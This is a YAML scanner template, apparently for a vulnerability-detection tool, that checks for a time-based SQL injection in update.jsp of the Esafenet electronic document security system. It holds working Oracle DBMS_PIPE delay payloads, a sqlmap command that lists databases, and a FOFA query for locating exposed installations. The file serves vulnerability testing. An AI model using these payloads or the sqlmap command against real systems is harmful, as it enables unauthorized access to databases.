id: esafenet-update-time-sqli-2

info:
  name: 亿赛通文档安全管理系统update.jsp sql时间注入
  author: zan8in
  severity: high
  verified: true
  description: |-
    亿赛通电子文档安全管理系统update.jsp存在延迟注入。
    python3 sqlmap.py -u "https://xxxxx/CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)" --batch --dbs
    FOFA: title="电子文档安全管理系统" && product="亿赛通-电子文档安全管理系统"
  reference:
    - https://mp.weixin.qq.com/s/ClWs4d3l_2ZsNvCJFiY9gg
  tags: esafenet,sqli
  created: 2023/10/18

rules:
  r0:
    request:
      method: GET
      path: "/CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3) AND 4546=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(88)||CHR(86)||CHR(83),2)-- aUVF"
    expression: response.body.bcontains(b'激活成功！激活人数为') && response.latency <= 7000 &&  response.latency >= 6000 
  r1:
    request:
      method: GET
      path: "/CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3) AND 4546=DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(88)||CHR(86)||CHR(83),4)-- aUVF"
    expression: response.body.bcontains(b'激活成功！激活人数为') && response.latency <= 13000 &&  response.latency >= 12000  
expression: r0() && r1())
  